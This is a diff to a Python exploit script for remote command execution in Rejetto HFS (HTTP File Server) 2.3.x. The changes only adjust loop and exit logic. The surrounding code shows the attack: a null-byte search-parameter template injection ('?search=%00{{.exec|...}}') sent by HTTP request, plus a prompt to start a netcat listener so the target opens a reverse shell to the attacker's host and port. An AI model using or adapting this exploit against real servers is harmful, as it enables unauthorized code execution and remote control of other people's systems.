@@ -23,6 +23,7 @@ class HFS():
             nc_check = input("Is netcat running? y or n? ")
             if nc_check == 'y':
                 self.hfs_exploit()
+                break
             elif nc_check == 'n':
                 print("Make sure netcat is running with nc -lvnp " + self.lport)
                 continue
@@ -46,8 +47,6 @@ class HFS():
         full_url = self.url + "?search=%00{{.exec|" + full_payload + ".}}"
         requests.get(full_url)
 
-        exit()
-
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Rejetto HFS (HTTP File Server) 2.3.x - Remote Command Execution')
 
@@ -56,9 +55,8 @@ if __name__ == "__main__":
     parser.add_argument('-lport', metavar='<lport>', help='Your Listening Port', required=True)  
     args = parser.parse_args()
 
-    while True:
-        try:
-            HFS(args.t,args.lhost,args.lport)
-        except KeyboardInterrupt:
-            print("\nBye Bye!")
-            exit()
+    try:
+        HFS(args.t,args.lhost,args.lport)
+    except KeyboardInterrupt:
+        print("\nBye Bye!")
+        exit()
